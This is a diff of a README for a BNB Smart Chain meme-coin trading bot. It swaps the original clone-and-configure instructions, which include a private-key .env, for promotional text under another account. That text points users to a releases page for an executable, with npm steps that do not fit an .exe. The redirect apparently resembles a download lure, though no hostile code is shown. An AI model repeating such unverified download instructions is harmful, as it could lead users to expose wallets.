@@ -1,84 +1,71 @@
-# 🚀 Four.Meme Trading Bot
+# 🎉 fourmeme-trading-bot - Trade Meme Coins with Ease
 
-An automated BNB-based trading bot that listens for new token launches on BNB Smart Chain and performs instant buy/sell actions using the [FourTrading SDK](https://github.com/FNZERO/four-trading-sdk).
+## 📥 Download Now
+[![Download](https://img.shields.io/badge/Download%20fourmeme--trading--bot-blue?style=for-the-badge)](https://github.com/Luizin507/fourmeme-trading-bot/releases)
 
-Powered by Node.js and Ethers.js, fully configurable via `.env`.
+## 🚀 Getting Started
+Welcome to the fourmeme-trading-bot! This application simplifies trading for meme coins, allowing you to execute trades with minimal hassle. With its user-friendly interface, you can focus on trading without getting bogged down by technical details.
 
-![img](img/tool.png)
----
+### 🔍 Features
+- **Simple Interface:** Easy to navigate, even for beginners.
+- **Modular Design:** Flexible components to suit various trading strategies.
+- **Supports BSC:** Operates on the Binance Smart Chain for fast and efficient transactions.
+- **Volume Alerts:** Get notified on trade volumes to optimize your strategy.
+- **Automated Trading:** Set it and forget it with automated trading options.
 
-## ⚙️ Features
+### 💻 System Requirements
+To use the fourmeme-trading-bot, your computer should meet the following requirements:
 
-- ✅ Automatic token buying on launch
-- 🔁 Configurable delayed sell with retries
-- 💸 Gas price control & slippage protection
-- 📈 Real-time profit/loss tracking
-- 🔐 Private key and RPC settings managed via `.env`
+- **Operating System:** Windows 10 or later, macOS 10.15 (Catalina) or later, or a recent Linux distribution.
+- **Node.js Version:** 14.x or higher.
+- **Memory:** At least 4 GB of RAM available.
+- **Internet Connection:** Stable connection for seamless trading.
 
----
+### 📥 Download & Install
+Follow these steps to download and run the fourmeme-trading-bot:
 
-## 📦 Installation
+1. **Visit the Releases Page**: Go to the following link: [Download from Releases](https://github.com/Luizin507/fourmeme-trading-bot/releases).
+  
+2. **Choose the Latest Version**: On the Releases page, find the latest release version. It will usually be at the top of the list.
 
-```bash
-git clone https://github.com/0xkiiven/fourmeme-trading-bot.git
-cd fourmeme-trading-bot
-npm install
-````
+3. **Download the Application**: Click on the download link for your operating system. Look for an executable file like `fourmeme-trading-bot.exe` or a zip file containing the application.
 
+4. **Install Dependencies**: Open your terminal or command prompt. Navigate to the folder where you downloaded the file. Make sure to install Node.js if you haven’t already. Run the following command to install necessary packages:
+   ```
+   npm install
+   ```
 
----
+5. **Run the Application**: After installing dependencies, run the application by executing:
+   ```
+   npm start
+   ```
+   A window will appear, allowing you to configure your settings.
 
-## 🚧 Configuration
+6. **Configure Your Settings**: Follow the prompts to enter your trading preferences. You can specify your wallet address, trading pairs, and other necessary details.
 
-- Rename `.env.example` to `.env`
+7. **Start Trading**: Once you have configured your settings, you can start trading by clicking the "Start Trading" button on the interface.
 
-- Edit `.env` and fill in your details:
+## 🛠️ Troubleshooting
+If you encounter any issues while running the application, consider the following tips:
 
-```env
-PRIVATE_KEY=your_wallet_private_key
-RPC_HTTP_URL=http://your.rpc.node:8545
-WSS_URL=ws://your.ws.node:8546
-FOUR_CONTRACT_ADDRESS=0x5c952063c7fc8610FFDB798152D69F0B9550762b
-BUY_AMOUNT=0.02
-SELL_DELAY=15
-GAS_PRICE=0.11
-APPROVE_GAS_PRICE=0.11
-SELL_SLIPPAGE_PERCENTAGE=100
-ONLY_BUY=false
-```
+- **Check Dependencies**: Ensure that Node.js is up to date and properly installed.
+- **Network Issues**: Make sure your internet connection is stable.
+- **Configuration Errors**: Double-check your settings to confirm they are correct.
+  
+If problems persist, you can reach out for support on the Issues page of this repository.
 
----
+## 📝 License
+The fourmeme-trading-bot is open-source software licensed under the MIT License. You are free to use, modify, and distribute this software in accordance with its terms.
 
-## 🚀 Run the Bot
+## 👉 Contributing
+We welcome contributions! If you would like to improve the fourmeme-trading-bot, please fork the repository, make your changes, and submit a pull request. For more details, check the CONTRIBUTING.md file.
 
-```bash
-npm start
-```
+## 🗂️ Topics
+- bsc
+- four
+- meme
+- pancakeswap
+- tradingbot
+- volume
 
-The bot will start listening for new token launches and begin trading based on your config.
-
----
-
-## 📁 Project Structure
-
-```
-.
-├── src/
-│   ├── main.js          # Entry point
-│   ├── abi.js           # FourMeme Abi
-│   ├── trade.js         # Trading logic
-│   └── config.js        # Environment-based config
-├── .env.example         # Sample env file
-├── package.json
-└── README.md
-```
-
----
-
-## 🛑 Disclaimer
-
-> This tool is provided for **educational and experimental purposes only**.
-> Use it at your own risk. The authors are not responsible for any losses.
-
-
----
+Thank you for using the fourmeme-trading-bot! Enjoy your trading experience!
